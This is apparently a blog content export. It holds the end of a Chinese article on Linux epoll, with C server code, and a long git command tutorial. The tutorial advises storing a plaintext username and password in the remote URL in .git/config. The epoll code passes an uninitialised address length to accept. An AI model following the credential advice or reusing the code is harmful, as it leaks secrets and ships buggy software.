//进行遍历;这里只要遍历已经准备好的io事件。num并不是当初epoll_create时的FDSIZE。\n     for (i = 0;i < num;i++)\n     {\n         fd = events[i].data.fd;\n        //根据描述符的类型和事件类型进行处理\n         if ((fd == listenfd) &&(events[i].events & EPOLLIN))\n            handle_accpet(epollfd,listenfd);\n         else if (events[i].events & EPOLLIN)\n            do_read(epollfd,fd,buf);\n         else if (events[i].events & EPOLLOUT)\n            do_write(epollfd,fd,buf);\n     }\n}\n\n//添加事件\nstatic void add_event(int epollfd,int fd,int state){\n    struct epoll_event ev;\n    ev.events = state;\n    ev.data.fd = fd;\n    epoll_ctl(epollfd,EPOLL_CTL_ADD,fd,&ev);\n}\n\n//处理接收到的连接\nstatic void handle_accpet(int epollfd,int listenfd){\n     int clifd;     \n     struct sockaddr_in cliaddr;     \n     socklen_t  cliaddrlen;     \n     clifd = accept(listenfd,(struct sockaddr*)&cliaddr,&cliaddrlen);     \n     if (clifd == -1)         \n     perror(\"accpet error:\");     \n     else {         \n         printf(\"accept a new client: %s:%d\\n\",inet_ntoa(cliaddr.sin_addr),cliaddr.sin_port);                       //添加一个客户描述符和事件         \n         add_event(epollfd,clifd,EPOLLIN);     \n     } \n}\n\n//读处理\nstatic void do_read(int epollfd,int fd,char *buf){\n    int nread;\n    nread = read(fd,buf,MAXSIZE);\n    if (nread == -1)     {         \n        perror(\"read error:\");         \n        close(fd); //记住close fd        \n        delete_event(epollfd,fd,EPOLLIN); //删除监听 \n    }\n    else if (nread == 0)     {         \n        fprintf(stderr,\"client close.\\n\");\n        close(fd); //记住close fd       \n        delete_event(epollfd,fd,EPOLLIN); //删除监听 \n    }     \n    else {         \n        printf(\"read message is : %s\",buf);        \n        //修改描述符对应的事件，由读改为写         \n        modify_event(epollfd,fd,EPOLLOUT);     \n    } \n}\n\n//写处理\nstatic void do_write(int epollfd,int fd,char *buf) {     \n    int nwrite;     \n    nwrite = write(fd,buf,strlen(buf));     \n    if (nwrite == -1){         \n        perror(\"write error:\");        \n        close(fd);   //记住close fd       \n        delete_event(epollfd,fd,EPOLLOUT);  //删除监听    \n    }else{\n        modify_event(epollfd,fd,EPOLLIN); \n    }    \n    memset(buf,0,MAXSIZE); \n}\n\n//删除事件\nstatic void delete_event(int epollfd,int fd,int state) {\n    struct epoll_event ev;\n    ev.events = state;\n    ev.data.fd = fd;\n    epoll_ctl(epollfd,EPOLL_CTL_DEL,fd,&ev);\n}\n\n//修改事件\nstatic void modify_event(int epollfd,int fd,int state){     \n    struct epoll_event ev;\n    ev.events = state;\n    ev.data.fd = fd;\n    epoll_ctl(epollfd,EPOLL_CTL_MOD,fd,&ev);\n}\n\n//注：另外一端我就省了\n```\n\n### 四 epoll总结\n\n在 select/poll中，进程只有在调用一定的方法后，内核才对所有监视的文件描述符进行扫描，而**epoll事先通过epoll_ctl()来注册一 个文件描述符，一旦基于某个文件描述符就绪时，内核会采用类似callback的回调机制，迅速激活这个文件描述符，当进程调用epoll_wait() 时便得到通知**。(`此处去掉了遍历文件描述符，而是通过监听回调的的机制`。这正是epoll的魅力所在。)\n\n**epoll的优点主要是一下几个方面：**\n1. 监视的描述符数量不受限制，它所支持的FD上限是最大可以打开文件的数目，这个数字一般远大于2048,举个例子,在1GB内存的机器上大约是10万左 右，具体数目可以cat /proc/sys/fs/file-max察看,一般来说这个数目和系统内存关系很大。select的最大缺点就是进程打开的fd是有数量限制的。这对 于连接数量比较大的服务器来说根本不能满足。虽然也可以选择多进程的解决方案( Apache就是这样实现的)，不过虽然linux上面创建进程的代价比较小，但仍旧是不可忽视的，加上进程间数据同步远比不上线程间同步的高效，所以也不是一种完美的方案。\n\n1. IO的效率不会随着监视fd的数量的增长而下降。epoll不同于select和poll轮询的方式，而是通过每个fd定义的回调函数来实现的。只有就绪的fd才会执行回调函数。\n\n> 如果没有大量的idle -connection或者dead-connection，epoll的效率并不会比select/poll高很多，但是当遇到大量的idle- connection，就会发现epoll的效率大大高于select/poll。\n\n# 参考\n\n[用户空间与内核空间，进程上下文与中断上下文总结](http://www.cnblogs.com/Anker/p/3269106.html)\n\n[进程切换](http://guojing.me/linux-kernel-architecture/posts/process-switch/)\n\n[维基百科-文件描述符](https://zh.wikipedia.org/wiki/文件描述符)\n\n[Linux 中直接 I/O 机制的介绍](http://www.ibm.com/developerworks/cn/linux/l-cn-directio/)\n\n[IO - 同步，异步，阻塞，非阻塞 （亡羊补牢篇）](http://blog.csdn.net/historyasamirror/article/details/5778378)\n\n[Linux中select poll和epoll的区别](http://www.cnblogs.com/bigwangdi/p/3182958.html)\n\n[IO多路复用之select总结](http://www.cnblogs.com/Anker/archive/2013/08/14/3258674.html)\n\n[IO多路复用之poll总结](http://www.cnblogs.com/Anker/archive/2013/08/15/3261006.html)\n\n[IO多路复用之epoll总结](http://www.cnblogs.com/Anker/archive/2013/08/17/3263780.html)","categories":["转载"],"tags":["Linux","select","poll","epoll"]},{"title":"【Linux 命令】git","url":"/linux-command/git/","content":"\n是目前世界上最先进的分布式版本控制系统\n\n## 补充说明\n\n**git命令** 很多人都知道，Linus在1991年创建了开源的Linux，从此，Linux系统不断发展，已经成为最大的服务器系统软件了。\n\nLinus虽然创建了Linux，但Linux的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为Linux编写代码，那Linux的代码是如何管理的呢？\n\n事实是，在2002年以前，世界各地的志愿者把源代码文件通过diff的方式发给Linus，然后由Linus本人通过手工方式合并代码！\n\n你也许会想，为什么Linus不把Linux代码放到版本控制系统里呢？不是有CVS、SVN这些免费的版本控制系统吗？因为Linus坚定地反对CVS和SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比CVS、SVN好用，但那是付费的，和Linux的开源精神不符。\n\n不过，到了2002年，Linux系统已经发展了十年了，代码库之大让Linus很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是Linus选择了一个商业的版本控制系统BitKeeper，BitKeeper的东家BitMover公司出于人道主义精神，授权Linux社区免费使用这个版本控制系统。\n\n安定团结的大好局面在2005年就被打破了，原因是Linux社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发Samba的Andrew试图破解BitKeeper的协议（这么干的其实也不只他一个），被BitMover公司发现了（监控工作做得不错！），于是BitMover公司怒了，要收回Linux社区的免费使用权。\n\nLinus可以向BitMover公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是这样的：\n\nLinus花了两周时间自己用C写了一个分布式版本控制系统，这就是Git！一个月之内，Linux系统的源码已经由Git管理了！牛是怎么定义的呢？大家可以体会一下。\n\nGit迅速成为最流行的分布式版本控制系统，尤其是2008年，GitHub网站上线了，它为开源项目免费提供Git存储，无数开源项目开始迁移至GitHub，包括jQuery，PHP，Ruby等等。\n\n历史就是这么偶然，如果不是当年BitMover公司威胁Linux社区，可能现在我们就没有免费而超级好用的Git了。\n\n[Git常用命令清单](https://github.com/jaywcjlove/handbook/blob/master/other/Git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95.md)\n\n###  语法\n\n```shell\ngit [--version] [--help] [-C <path>] [-c name=value]\n   [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]\n   [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]\n   [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]\n   <command> [<args>]\n```\n\n###  选项\n\n```shell\nadd              将文件内容添加到索引\nbisect           通过二进制查找引入错误的更改\nbranch           列出，创建或删除分支\ncheckout         检查分支或路径到工作树\nclone            将存储库克隆到新目录中\ncommit           将更改记录到存储库\ndiff             显示提交，提交和工作树等之间的更改\nfetch            从另一个存储库下载对象和引用\ngrep             打印匹配图案的行\ninit             创建一个空的Git仓库或重新初始化一个现有的\nlog              显示提交日志\nmerge            加入两个或更多的开发历史\nmv               移动或重命名文件，目录或符号链接\npull             从另一个存储库或本地分支获取并合并\npush             更新远程引用以及相关对象\nrebase           转发端口本地提交到更新的上游头\nreset            将当前HEAD复位到指定状态\nrm               从工作树和索引中删除文件\nshow             显示各种类型的对象\nstatus           显示工作树状态\ntag              创建，列出，删除或验证使用GPG签名的标签对象\n```\n\n### 例子\n\ninit\n\n`git init` #初始化  \n\nstatus\n\n`git status` #获取状态  \n\nadd\n\n`git add file` # .或*代表全部添加  \n`git rm --cached <added_file_to_undo>` # 在commit之前撤销git add操作  \n`git reset head` # 好像比上面`git rm --cached`更方便  \n\ncommit\n\n`git commit -m \"message\"` #此处注意乱码  \n\nremote\n\n`git remote add origin git@github.com:JSLite/test.git` #添加源  \n\npush\n\n```shell\ngit push -u origin master # push同事设置默认跟踪分支  \ngit push origin master  \ngit push -f origin master # 强制推送文件，缩写 -f（全写--force）\n```\n\nclone\n\n`git clone git://github.com/JSLite/JSLite.js.git `  \n`git clone git://github.com/JSLite/JSLite.js.git mypro` #克隆到自定义文件夹  \n`git clone [user@]example.com:path/to/repo.git/` #SSH协议还有另一种写法。  \n\ngit clone支持多种协议，除了HTTP(s)以外，还支持SSH、Git、本地文件协议等，下面是一些例子。`git clone <版本库的网址> <本地目录名>`  \n\n```shell\n$ git clone http[s]://example.com/path/to/repo.git/\n$ git clone ssh://example.com/path/to/repo.git/\n$ git clone git://example.com/path/to/repo.git/\n$ git clone /opt/git/project.git \n$ git clone file:///opt/git/project.git\n$ git clone ftp[s]://example.com/path/to/repo.git/\n$ git clone rsync://example.com/path/to/repo.git/\n```\n\n## 配置\n\n首先是配置帐号信息 `ssh -T git@github.com` 测试。\n\n## 修改项目中的个人信息\n\n```shell\ngit help config # 获取帮助信息，查看修改个人信息的参数  \ngit config --global user.name \"小弟调调\"           # 修改全局名字\ngit config --global user.email \"wowohoo@qq.com\"  # 修改全局邮箱\ngit config --list         # 查看配置的信息  \n```\n\n### 配置自动换行\n\n自动转换坑太大，提交到git是自动将换行符转换为lf \n\n```shell\ngit config --global core.autocrlf input\n```\n\n## 常见使用场景\n\n### 创建SSH密钥\n\n这个密钥用来跟 github 通信，在本地终端里生成然后上传到 github\n\n```shell\nssh-keygen -t rsa -C 'wowohoo@qq.com' # 生成密钥  \nssh-keygen -t rsa -C \"wowohoo@qq.com\" -f ~/.ssh/ww_rsa # 指定生成目录文件名字\nssh -T git@github.com # 测试是否成功  \n```\n\n### 多账号ssh配置\n\n**1.生成指定名字的密钥**\n\n`ssh-keygen -t rsa -C \"邮箱地址\" -f ~/.ssh/jslite_rsa`  \n会生成 `jslite_rsa` 和 `jslite_rsa.pub` 这两个文件  \n\n**2.密钥复制到托管平台上**\n\n`vim ~/.ssh/jslite_rsa.pub`   \n打开公钥文件 `jslite_rsa.pub` ，并把内容复制至代码托管平台上   \n\n**3.修改config文件**\n\n`vim ~/.ssh/config` #修改config文件，如果没有创建 `config`  \n\n```shell\nHost jslite.github.com\n  HostName github.com\n  User git\n  IdentityFile ~/.ssh/jslite_rsa\n\nHost work.github.com\n  HostName github.com\n  # Port 服务器open-ssh端口（默认：22,默认时一般不写此行）\n  # PreferredAuthentications 配置登录时用什么权限认证 \n  #                          publickey|password publickey|keyboard-interactive等\n  User git\n  IdentityFile ~/.ssh/work_rsa\n```\n\n- `Host` 这里是个别名可以随便命名\n- `HostName` 一般是网站如：`git@ss.github.com:username/repo.git` 填写 `github.com`\n- `User` 通常填写`git`\n- `IdentityFile` 使用的公钥文件地址\n\n**4.测试**\n\n```shell\nssh -T git@jslite.github.com  # `@`后面跟上定义的Host  \nssh -T work.github.com        # 通过别名测试\nssh -i ~/公钥文件地址 Host别名  # 如 ssh -i ~/.ssh/work_rsa work.github.com\n```\n\n**5.使用**\n\n```shell\n# 原来的写法\ngit clone git@github.com:<jslite的用户名>/learngit.git\n# 现在的写法\ngit clone git@jslite.github.com:<jslite的用户名>/learngit.git\ngit clone git@work.github.com:<work的用户名>/learngit.git\n```\n\n**5.注意**\n\n如果你修改了id_rsa的名字，你需要将ssh key添加到SSH agent中，如：\n\n```shell\nssh-add ~/.ssh/jslite_rsa\nssh-add -l  # 查看所有的key\nssh-add -D  # 删除所有的key\nssh-add -d  ~/.ssh/jslite_rsa # 删除指定的key\n```\n\n### 免密码登录远程服务器\n\n```shell\n$ ssh-keygen -t rsa -P '' -f ~/.ssh/aliyunserver.key\n$ ssh-copy-id -i ~/.ssh/aliyunserver.key.pub root@192.168.182.112 # 这里需要输入密码一次\n```\n\n编辑 `~/.ssh/config`\n\n```shell\nHost aliyun1\n  HostName 192.168.182.112\n  User root\n  PreferredAuthentications publickey\n  IdentityFile ~/.ssh/aliyunserver.key\n```\n\n上面配置完了，可以通过命令登录，不需要输入IP地址和密码 `ssh aliyun1`\n\n### https协议下提交代码免密码\n\n```shell\ngit clone https://github.com/username/rep.git\n```\n\n通过上面方式克隆可能需要密码，解决办法：进入当前克隆的项目 `vi rep/.git/config` 编辑 `config`, 按照下面方式修改，你就可以提交代码不用输入密码了。\n\n```shell\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n\tignorecase = true\n\tprecomposeunicode = true\n[remote \"origin\"]\n-\turl = https://github.com/username/rep.git\n+\turl = https://用户名:密码@github.com/username/rep.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\n\n### 文件推向3个git库\n\n**1. 增加3个远程库地址**\n\n```shell\ngit remote add origin https://github.com/JSLite/JSLite.git  \ngit remote set-url --add origin https://gitlab.com/wang/JSLite.js.git  \ngit remote set-url --add origin https://oschina.net/wang/JSLite.js.git  \n```\n\n**2. 删除其中一个 set-url 地址**\n\n```shell\nusage: git remote set-url [--push] <name> <newurl> [<oldurl>]\n   or: git remote set-url --add <name> <newurl>\n   or: git remote set-url --delete <name> <url>\n```\n\n`git remote set-url --delete origin https://oschina.net/wang/JSLite.js.git`\n\n**3.推送代码**\n\n```shell\ngit push origin master\ngit push -f origin master  # 强制推送  \n```\n\n**4.拉代码**\n\n只能拉取 `origin` 里的一个url地址，这个fetch-url  \n默认为你添加的到 `origin`的第一个地址  \n\n```shell\ngit pull origin master   \ngit pull --all # 获取远程所有内容包括tag  \ngit pull origin next:master # 取回origin主机的next分支，与本地的master分支合并  \ngit pull origin next # 远程分支是与当前分支合并  \n\n# 上面一条命令等同于下面两条命令   \ngit fetch origin  \ngit merge origin/next  \n```\n\n如果远程主机删除了某个分支，默认情况下，git pull 不会在拉取远程分支的时候，删除对应的本地分支。这是为了防止，由于其他人操作了远程主机，导致git pull不知不觉删除了本地分支。  \n但是，你可以改变这个行为，加上参数 -p 就会在本地删除远程已经删除的分支。  \n\n```shell\n$ git pull -p\n# 等同于下面的命令\n$ git fetch --prune origin \n$ git fetch -p\n```\n\n**5.更改pull**\n\n只需要更改config文件里，那三个url的顺序即可，fetch-url会直接对应排行第一的那个utl连接。    \n\n\n### 修改远程仓库地址\n\n```shell\ngit remote remove origin  # 删除该远程路径  \ngit remote add origin git@jslite.github.com:JSLite/JSLite.git  # 添加远程路径 \n```\n\n### 撤销远程记录\n\n```shell\ngit reset --hard HEAD~1 # 撤销一条记录   \ngit push -f origin HEAD:master # 同步到远程仓库  \n```\n\n### 放弃本地的文件修改\n\n```shell\ngit reset --hard FETCH_HEAD # FETCH_HEAD表示上一次成功git pull之后形成的commit点。然后git pull\n```\n\n`git reset --hard FETCH_HEAD` 出现错误\n\n```shell\ngit pull\nYou are not currently on a branch, so I cannot use any\n'branch.<branchname>.merge' in your configuration file.\nPlease specify which remote branch you want to use on the command\nline and try again (e.g. 'git pull <repository> <refspec>').\nSee git-pull(1) FOR details.\n```\n\n解决方法：\n\n```shell\ngit checkout -b temp # 新建+切换到temp分支 \ngit checkout master\n```\n\n### 最简单放弃本地修改内容\n\n```shell\n# 如果有的修改以及加入暂存区的话\ngit reset --hard \n# 还原所有修改，不会删除新增的文件\ngit checkout . \n# 下面命令会删除新增的文件\ngit clean -xdf\n```\n\n通过存储暂存区stash，在删除暂存区的方法放弃本地修改。\n\n```shell\ngit stash && git stash drop \n```\n\n### 回滚到某个commit提交\n\n```shell\ngit revert HEAD~1 # 撤销一条记录 会弹出 commit 编辑\ngit push # 提交回滚\n```\n\n\n### 回退到某一个版本\n\n```shell\ngit reset --hard <hash>\n# 例如 git reset --hard a3hd73r\n# --hard代表丢弃工作区的修改，让工作区与版本代码一模一样，与之对应，\n# --soft参数代表保留工作区的修改。\n```\n\n### 去掉某个commit\n\n```shell\n# 实质是新建了一个与原来完全相反的commit，抵消了原来commit的效果\ngit revert <commit-hash> \n```\n\n### 新建一个空分支\n\n```shell\n# 这种方式新建的分支(gh-pages)是没有 commit 记录的\ngit checkout --orphan gh-pages\n# 删除新建的gh-pages分支原本的内容，如果不删除，提交将作为当前分支的第一个commit\ngit rm -rf .\n# 查看一下状态 有可能上面一条命令，没有删除还没有提交的的文件\ngit state \n```\n\n### 合并多个commit\n\n```shell\n# 这个命令，将最近4个commit合并为1个，HEAD代表当前版本。\n# 将进入VIM界面，你可以修改提交信息。\ngit rebase -i HEAD~4 \n# 可以看到其中分为两个部分，上方未注释的部分是填写要执行的指令，\n# 而下方注释的部分则是指令的提示说明。指令部分中由前方的命令名称、commit hash 和 commit message 组成\n# 当前我们只要知道 pick 和 squash 这两个命令即可。\n# --> pick 的意思是要会执行这个 commit\n# --> squash 的意思是这个 commit 会被合并到前一个commit\n\n# 我们将 需要保留的 这个 commit 前方的命令改成 squash 或 s，然后输入:wq以保存并退出\n# 这是我们会看到 commit message 的编辑界面\n\n# 其中, 非注释部分就是两次的 commit message, 你要做的就是将这两个修改成新的 commit message。\n# \n# 输入wq保存并推出, 再次输入git log查看 commit 历史信息，你会发现这两个 commit 已经合并了。\n# 将修改强制推送到前端\ngit push -f origin master\n```\n\n### 修改远程Commit记录\n\n```shell\ngit commit --amend\n# amend只能修改没有提交到线上的，最后一次commit记录\ngit rebase -i HEAD~3\n# 表示要修改当前版本的倒数第三次状态\n# 将要更改的记录行首单词 pick 改为 edit\npick 96dc3f9 doc: Update quick-start.md\npick f1cce8a test(Transition):Add transition test (#47)\npick 6293516 feat(Divider): Add Divider component.\n# Rebase eeb03a4..6293516 onto eeb03a4 (3 commands)\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n# d, drop = remove commit\n```\n\n保存并退出，会弹出下面提示\n\n```shell\n# You can amend the commit now, with\n# \n#   git commit --amend\n# \n# Once you are satisfied with your changes, run\n# \n#   git rebase --continue\n\n# 通过这条命令进入编辑页面更改commit，保存退出\ngit commit --amend\n# 保存退出确认修改，继续执行 rebase, \ngit rebase --continue\n# 如果修改多条记录反复执行上面两条命令直到完成所有修改\n\n# 最后，确保别人没有提交进行push，最好不要加 -f 强制推送\ngit push -f origin master\n```\n\n\n\n### 添加忽略文件\n\n```shell\necho node_modules/ >> .gitignore\n```\n\n### 利用commit关闭一个issue\n\n这个功能在Github上可以玩儿，Gitlab上特别老的版本不能玩儿哦，那么如何跟随着commit关闭一个issue呢? 在confirm merge的时候可以使用一下命令来关闭相关issue:  \n\n`fixes #xxx`、 `fixed #xxx`、 `fix #xxx`、 `closes #xxx`、 `close #xxx`、 `closed #xxx`、\n\n### 同步fork的上游仓库\n\n[Github教程同步fork教程](https://help.github.com/articles/syncing-a-fork/)，[在Github上同步一个分支(fork)](http://www.miss77.net/549.html)  \n\n**设置添加多个远程仓库地址。**\n\n在同步之前，需要创建一个远程点指向上游仓库(repo).如果你已经派生了一个原始仓库，可以按照如下方法做。\n\n```shell\n$ git remote -v\n# List the current remotes （列出当前远程仓库）\n# origin  https://github.com/user/repo.git (fetch)\n# origin  https://github.com/user/repo.git (push)\n$ git remote add upstream https://github.com/otheruser/repo.git\n# Set a new remote (设置一个新的远程仓库)\n$ git remote -v\n# Verify new remote (验证新的原唱仓库)\n# origin    https://github.com/user/repo.git (fetch)\n# origin    https://github.com/user/repo.git (push)\n# upstream  https://github.com/otheruser/repo.git (fetch)\n# upstream  https://github.com/otheruser/repo.git (push)\n```\n\n**同步更新仓库内容**\n\n同步上游仓库到你的仓库需要执行两步：首先你需要从远程拉去，之后你需要合并你希望的分支到你的本地副本分支。从上游的存储库中提取分支以及各自的提交内容。 `master` 将被存储在本地分支机构 `upstream/master`\n\n```shell\ngit fetch upstream\n# remote: Counting objects: 75, done.\n# remote: Compressing objects: 100% (53/53), done.\n# remote: Total 62 (delta 27), reused 44 (delta 9)\n# Unpacking objects: 100% (62/62), done.\n# From https://github.com/ORIGINAL_OWNER/ORIGINAL_REPOSITORY\n#  * [new branch]      master     -> upstream/master\n```\n\n检查你的 fork's 本地 `master` 分支\n\n```shell\ngit checkout master\n# Switched to branch 'master'\n```\n\n合并来自 `upstream/master` 的更改到本地 master  分支上。  这使你的前 fork's `master` 分支与上游资源库同步，而不会丢失你本地修改。  \n\n```shell\ngit merge upstream/master\n# Updating a422352..5fdff0f\n# Fast-forward\n#  README                    |    9 -------\n#  README.md                 |    7 ++++++\n#  2 files changed, 7 insertions(+), 9 deletions(-)\n#  delete mode 100644 README\n#  create mode 100644 README.md\n```\n\n\n### 批量修改历史commit中的名字和邮箱\n\n**1.克隆仓库**\n\n注意参数，这个不是普通的clone，clone下来的仓库并不能参与开发\n\n```shell\ngit clone --bare https://github.com/user/repo.git\ncd repo.git\n```\n\n**2.命令行中运行代码**\n\nOLD_EMAIL原来的邮箱  \nCORRECT_NAME更正的名字  \nCORRECT_EMAIL更正的邮箱  \n\n将下面代码复制放到命令行中执行\n\n```shell\ngit filter-branch -f --env-filter '\nOLD_EMAIL=\"wowohoo@qq.com\"\nCORRECT_NAME=\"小弟调调\"\nCORRECT_EMAIL=\"更正的邮箱@qq.com\"\nif [ \"$GIT_COMMITTER_EMAIL\" = \"$OLD_EMAIL\" ]\nthen\n    export GIT_COMMITTER_NAME=\"$CORRECT_NAME\"\n    export GIT_COMMITTER_EMAIL=\"$CORRECT_EMAIL\"\nfi\nif [ \"$GIT_AUTHOR_EMAIL\" = \"$OLD_EMAIL\" ]\nthen\n    export GIT_AUTHOR_NAME=\"$CORRECT_NAME\"\n    export GIT_AUTHOR_EMAIL=\"$CORRECT_EMAIL\"\nfi\n' --tag-name-filter cat -- --branches --tags\n```\n\n执行过程\n\n```shell\nRewrite 160d4df2689ff6df3820563bfd13b5f1fb9ba832 (479/508) (16 seconds passed, remaining 0 predicted)\nRef 'refs/heads/dev' was rewritten\nRef 'refs/heads/master' was rewritten\n```\n\n**3.同步到远程仓库**\n\n同步到push远程git仓库\n\n```shell\ngit push --force --tags origin 'refs/heads/*'\n```\n\n我还遇到了如下面错误，lab默认给master分支加了保护，不允许强制覆盖。`Project(项目)`->`Setting`->`Repository` 菜单下面的`Protected branches`把master的保护去掉就可以了。修改完之后，建议把master的保护再加回来，毕竟强推不是件好事。\n\n```shell\nremote: GitLab: You are not allowed to force push code to a protected branch on this project.\n```\n\n当上面的push 不上去的时候，先 `git pull` 确保最新代码\n\n```shell\ngit pull  --allow-unrelated-histories\n# 或者指定分枝\ngit pull origin master --allow-unrelated-histories\n```\n\n\n### 查看某个文件历史\n\n```shell\ngit log --pretty=oneline 文件名  # 列出文件的所有改动历史  \ngit show c178bf49   # 某次的改动的修改记录  \ngit log -p c178bf49 # 某次的改动的修改记录  \ngit blame 文件名     # 显示文件的每一行是在那个版本最后修改。  \ngit whatchanged 文件名  # 显示某个文件的每个版本提交信息：提交日期，提交人员，版本号，提交备注（没有修改细节）  \n```\n\n### 打造自己的git命令\n\n```shell\ngit config --global alias.st status\ngit config --global alias.br branch\ngit config --global alias.co checkout\ngit config --global alias.ci commit\n```\n\n配置好后再输入git命令的时候就不用再输入一大段了，例如我们要查看状态，只需：\n\n```shell\ngit st\n```\n\n### 中文乱码的解决方案\n\n```shell\ngit config --global core.quotepath false\n```\n\n## 新建仓库\n\n### init\n\n`git init` #初始化  \n\n### status\n\n`git status` #获取状态  \n\n### add\n\n`git add file` # .或*代表全部添加  \n`git rm --cached <added_file_to_undo>` # 在commit之前撤销git add操作  \n`git reset head` # 好像比上面`git rm --cached`更方便  \n\n### commit\n\n`git commit -m \"message\"` #此处注意乱码  \n\n### remote\n\n`git remote add origin git@github.com:JSLite/test.git` #添加源  \n\n### push\n\n```shell\ngit push -u origin master # push同事设置默认跟踪分支  \ngit push origin master  \ngit push -f origin master # 强制推送文件，缩写 -f（全写--force）\n```\n\n## clone\n\n`git clone git://github.com/JSLite/JSLite.js.git `  \n`git clone git://github.com/JSLite/JSLite.js.git mypro` #克隆到自定义文件夹  \n`git clone [user@]example.com:path/to/repo.git/` #SSH协议还有另一种写法。  \n\ngit clone支持多种协议，除了HTTP(s)以外，还支持SSH、Git、本地文件协议等，下面是一些例子。`git clone <版本库的网址> <本地目录名>`  \n\n```shell\n$ git clone http[s]://example.com/path/to/repo.git/\n$ git clone ssh://example.com/path/to/repo.git/\n$ git clone git://example.com/path/to/repo.git/\n$ git clone /opt/git/project.git \n$ git clone file:///opt/git/project.git\n$ git clone ftp[s]://example.com/path/to/repo.git/\n$ git clone rsync://example.com/path/to/repo.git/\n```\n\n## 本地\n\n### help\n\n```shell\ngit help config # 获取帮助信息  \n```\n\n### add\n\n```shell\ngit add *   # 跟踪新文件   \ngit add -u [path]   # 添加[指定路径下]已跟踪文件   \n```\n\n### rm\n\n```shell\nrm *&git rm *          # 移除文件  \ngit rm -f *            # 移除文件  \ngit rm --cached *      # 取消跟踪  \ngit mv file_from file_to  # 重命名跟踪文件  \ngit log   # 查看提交记录  \n```\n\n### commit\n\n```shell\ngit commit #提交更新   \ngit commit -m 'message' #提交说明   \ngit commit -a #跳过使用暂存区域，把所有已经跟踪过的文件暂存起来一并提交   \ngit commit --amend #修改最后一次提交   \ngit commit log #查看所有提交，包括没有push的commit    \ngit commit -m \"#133\" #关联issue 任意位置带上# 符号加上issue号码  \ngit commit -m \"fix #133\" commit关闭issue  \ngit commit -m '概要描述'$'\\n\\n''1.详细描述'$'\\n''2.详细描述' #提交简要描述和详细描述  \n```\n\n### reset\n\n```shell\ngit reset HEAD *  # 取消已经暂存的文件   \ngit reset --mixed HEAD * # 同上   \ngit reset --soft HEAD *  # 重置到指定状态，不会修改索引区和工作树   \ngit reset --hard HEAD *  # 重置到指定状态，会修改索引区和工作树   \ngit reset -- files *     # 重置index区文件   \n```\n\n### revert\n\n```shell\ngit revert HEAD   # 撤销前一次操作   \ngit revert HEAD~  # 撤销前前一次操作   \ngit revert commit # 撤销指定操作   \n```\n\n### checkout\n\n```shell\ngit checkout -- file  # 取消对文件的修改（从暂存区——覆盖worktree file）  \ngit checkout branch|tag|commit -- file_name  # 从仓库取出file覆盖当前分支   \ngit checkout HEAD~1 [文件]  # 将会更新 working directory 去匹配某次 commit   \ngit checkout -- .          # 从暂存区取出文件覆盖工作区   \ngit checkout -b gh-pages  0c304c9  # 这个表示 从当前分支 commit 哈希值为 0c304c9 的节点，分一个新的分支gh-pages出来，并切换到 gh-pages   \n```\n\n### diff\n\n```shell\ngit diff file     # 查看指定文件的差异   \ngit diff --stat   # 查看简单的diff结果   \ngit diff  # 比较Worktree和Index之间的差异   \ngit diff --cached   # 比较Index和HEAD之间的差异   \ngit diff HEAD       # 比较Worktree和HEAD之间的差异   \ngit diff branch     # 比较Worktree和branch之间的差异   \ngit diff branch1 branch2  # 比较两次分支之间的差异   \ngit diff commit commit    # 比较两次提交之间的差异   \ngit diff master..test   # 上面这条命令只显示两个分支间的差异  \ngit diff master...test    # 你想找出‘master’,‘test’的共有 父分支和'test'分支之间的差异，你用3个‘.'来取代前面的两个'.'  \n```\n\n### stash\n\n```shell\ngit stash # 将工作区现场（已跟踪文件）储藏起来，等以后恢复后继续工作。   \ngit stash list  # 查看保存的工作现场   \ngit stash apply # 恢复工作现场   \ngit stash drop  # 删除stash内容   \ngit stash pop   # 恢复的同时直接删除stash内容   \ngit stash apply stash@{0} # 恢复指定的工作现场，当你保存了不只一份工作现场时。   \n```\n\n### merge\n\n```shell\ngit merge --squash test # 合并压缩，将test上的commit压缩为一条   \n```\n\n### cherry-pick\n\n```shell\ngit cherry-pick commit    # 拣选合并，将commit合并到当前分支   \ngit cherry-pick -n commit # 拣选多个提交，合并完后可以继续拣选下一个提交   \n```\n\n### rebase\n\n```shell\ngit rebase master   # 将master分之上超前的提交，变基到当前分支  \ngit rebase --onto master 169a6  # 限制回滚范围，rebase当前分支从169a6以后的提交  \ngit rebase --interactive # 交互模式，修改commit   \ngit rebase --continue    # 处理完冲突继续合并   \ngit rebase --skip        # 跳过   \ngit rebase --abort       # 取消合并    \n```\n\n## 分支branch\n\n### 删除\n\n```shell\ngit push origin :branchName  # 删除远程分支  \ngit push origin --delete new # 删除远程分支new   \ngit branch -d branchName     # 删除本地分支，强制删除用-D  \ngit branch -d test      # 删除本地test分支   \ngit branch -D test      # 强制删除本地test分支   \ngit remote prune origin # 远程删除了，本地还能看到远程存在，这条命令删除远程不存在的分支\n```\n\n### 提交\n\n```shell\ngit push -u origin branchName # 提交分支到远程origin主机中  \n```\n\n### 拉取\n\n`git fetch -p` #拉取远程分支时，自动清理 远程分支已删除，本地还存在的对应同名分支。  \n\n### 分支合并\n\n```shell\ngit merge branchName      # 合并分支 - 将分支branchName和当前所在分支合并   \ngit merge origin/master   # 在本地分支上合并远程分支。   \ngit rebase origin/master  # 在本地分支上合并远程分支。   \ngit merge test            # 将test分支合并到当前分支   \n```\n\n### 重命名\n\n`git branch -m old new` #重命名分支  \n\n### 查看\n\n```shell\ngit branch      # 列出本地分支   \ngit branch -r   # 列出远端分支   \ngit branch -a   # 